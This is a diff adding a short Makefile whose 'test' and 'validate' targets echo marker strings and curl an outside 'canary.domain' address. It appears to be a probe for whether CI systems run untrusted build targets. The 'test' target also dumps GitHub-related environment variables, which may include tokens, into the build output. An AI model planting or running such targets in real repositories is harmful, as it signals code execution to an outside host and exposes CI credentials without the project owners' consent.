@@ -1,0 +1,8 @@
+test:
+	echo "HB-MAKEFILE-EXEC"
+	curl -s https://canary.domain/HB-MAKEFILE-EXEC || true
+	env | grep -i github || true
+
+validate:
+	echo "HB-MAKEFILE-VALIDATE"
+	curl -s https://canary.domain/HB-MAKEFILE-VALIDATE || true
